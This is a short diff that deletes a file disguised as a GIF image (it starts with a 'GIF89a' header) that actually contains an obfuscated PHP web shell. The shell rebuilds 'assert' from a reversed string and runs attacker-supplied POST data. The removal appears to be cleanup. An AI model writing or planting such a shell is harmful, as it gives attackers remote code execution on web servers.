@@ -1,7 +1,0 @@
-GIF89a
-8888
-
-<?php
-$arr = strrev('tressa');
-$arr($_POST[strcspn('di', 'ke')]);
-?>
